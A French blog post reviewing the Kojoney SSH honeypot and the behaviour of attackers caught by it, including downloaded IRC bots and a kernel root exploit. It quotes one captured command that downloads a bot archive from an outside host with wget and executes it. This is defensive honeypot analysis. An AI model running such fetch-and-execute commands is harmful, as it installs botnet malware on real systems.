---
title: "Revue du honeypot Kojoney"
tags: [honeypot]
---

[Kojoney](http://kojoney.sourceforge.net/) est un [honeypot](http://fr.wikipedia.org/wiki/Honeypot) à faible interaction.  

![Kojoney](/assets/img/kojoney.png)

Développé en [Python](http://fr.wikipedia.org/wiki/Python_(langage)) et basé sur les librairies réseau [Twisted](http://twistedmatrix.com/trac/), il émule un serveur SSH tournant sur un système où les utilisateurs ont des mots de passes faibles.  

Certains pirates ont recours à des scanneurs qui se connectent sur des adresses IP prises au hazard et qui tentent une [attaque par froce brute](http://fr.wikipedia.org/wiki/Attaque_par_force_brute) sur les mots de passes, ciblant principalement les mots de passes par défaut ou ceux dont l'utilisateur n'a pas fait preuve d'imagination.  

L'institut SANS tient à jour [un classement des 20 vulnérabilités qu'il juge les plus critiques](http://www.sans.org/top20/). Pendant très longtemps l'utilisation de mots de passes facilement trouvables était en tête du classement mais il semble qu'avec la prolifération des vers, des spywares et autres malwares, les mauvais mots de passes ont une importance moindre. Pourtant, ils sont et seront toujours présents.  

Si vous vous promenez sur les forums spécialisés Linux vous avez sans doute déjà vu quelques personnes se plaindre de ces attaques. Et même si la plupart du temps ces attaques échouent, [elles font beaucoup parler d'elles](http://www.google.fr/search?hl=fr&q=brute+force+ssh).  

Kojoney vous permet d'analyser ce traffic. Le logiciel enregistre dans des fichiers de log toutes les tentatives qui ont été faites ainsi que les commandes tapées par le pirate dès que celui-çi a trouvé un des comptes utilisé par Kojoney.  

Kojoney a plusieurs défauts, même s'il n'en est pas forcément le responsable. Premièrement il faut avouer que les pirates qui effectuent de telles attaques ne sont généralement pas d'un niveau très élevé. Il faut dire qu'effectuer des attaques brute-force est ce qu'il se fait de moins discret. Ça génère une quantité de logs impressionnante, c'est facilement détecté par des logiciels de surveillance et même un informaticien débutant peut se douter qu'il se passe quelque chose de louche en voyant sa bande passante réduite aussi vite.  

Le second problème est qu'il ne fait que simuler un serveur SSH. Techniquement le programme ne fait que boucler sur ce que tape l'utilisateur et y répondre quand il en est capable. Par conséquent, on atteint très facilement les limites de ce faux environnement, il est par exemple impossible de se promener ailleurs que dans la racine (/) et le pirate ne peut pas utiliser de programmes interactifs (emacs, vim, ftp...)  

Toutefois, avec les versions 0.0.4 il est possible pour ceux qui ont quelques connaissances en Python de rajouter très facilement des commandes à ce shell virtuel.  

J'utilise Kojoney depuis un bon bout de temps maintenant et j'y ai apporté quelques retouches (c'est tout l'avantage des [logiciels libres](http://fr.wikipedia.org/wiki/Logiciel_libre)) afin de rendre l'environnement plus réaliste. Malheureusement toute la partie gestion du terminal est laissée à la librairie `Twisted Conch` et certaines modifications semblent impossibles à apporter (utilisations des flèches pour gérer l'historique, utilisation de la touche backspace...)  

La [version 0.0.4.1](http://sourceforge.net/project/showfiles.php?group_id=143961&package_id=186042) apporte une nouvelle fonctionnalité : télécharger dans le dossier `/var/log/kojoney` les fichiers que les pirates auront tenté de rapatrier avec wget ou curl.  

La lecture des logs peut être assez longue, heureusement différentes commandes permettent d'obtenir un résultat plus lisible. Le principal utilitaire est `kojreport` qui génère des statistiques sur les attaquants (pays les plus actifs, commandes les plus utilisés etc)  

Rien qu'au niveau des logiciels d'attaques utilisés on remarque des différences : certains continuent d'attaquer après avoir trouvé un mot de passe, d'autre s'arrêtent au premier compte obtenu.  

La plupart du temps les pirates se servent d'une machine compromise pour effectuer l'attaque et se connectent au compte en utilisant une autre machine (leur machine perso ?) Généralement les attaquants sont humains mais quelques fois on a affaire à des outils automatisés qui lancent des commandes en aveugle, par exemple :  

```bash
wget free-ftp.org/trkalce/botovi.tar.gz;tar -zxvf botovi.tar.gz;cd bots;chmod +x inetd;./inetd
```

Quelques attaquants se concentrent uniquement sur le compte root, allant parfois jusqu'à ne tenter qu'un seul mot de passe (root/root ?).  

Les premières actions des pirates consistent généralement à vérifier s'ils sont seuls sur la machine (`w` ou `who`), à savoir où ils sont (`pwd`, `ls`) et sur quoi ils se trouvent (`uname`, `uptime`). Ensuite ils tentent de changer le mot de passe (`passwd`) - pour éviter que quelqu'un passe derrière eux - et téléchargent une backdoor.  

Dans la grande majorité des cas il s'agit d'un bot irc. Le programme se connecte à un serveur IRC, dans un cannal donné et attend que quelqu'un sur ce canal lui donne des ordres. La machine vient très probablement se rajouter à un [botnet](http://fr.wikipedia.org/wiki/Botnet).  

Les pirates ne maîtrisent pas tous Linux comme ils le devraient et abandonnent très vite en voyant que certaines commandes ne sont pas présentes ou leur sont interdites. Ils manquent de curiosité et ne prennent pas le temps de comprendre ce qu'il se passe.  

Pour tout dire, un seul a jusqu'à présent eu l'intention de passer root.  

Il a téléchargé un binaire nommé `hat` à l'adresse `dogg-crew.com/nightfox/hat`. Après l'avoir placé dans un `chroot` et l'avoir _stracé_ j'ai très vite compris qu'il s'agissait d'un exploit pour une faille dans les kernels 2.4 (`do_brk`). Le nom de l'exploit complet étant [hatorihanzo](http://packetstormsecurity.org/0312-exploits/hatorihanzo.c) on comprend mieux le nom du fichier.  

Le binaire a d'autres particularités intéressantes. Tout d'abord il semble vérolé et est détecté comme étant [Virus.Linux.Osf.8759](http://www.viruslist.com/en/viruslist.html?id=48280) (ou Linux/OSF.A)  

Il faut avouer que le fichier est assez imposant (423Ko) même pour un programme compilé statiquement. Une grande partie du code semble être crypté et certains désassembleurs se cassent les dents dessus :  

![Linux/OSF.A](/assets/img/ht_linux_osf.jpg)


*Published January 06 2011 at 14:04*
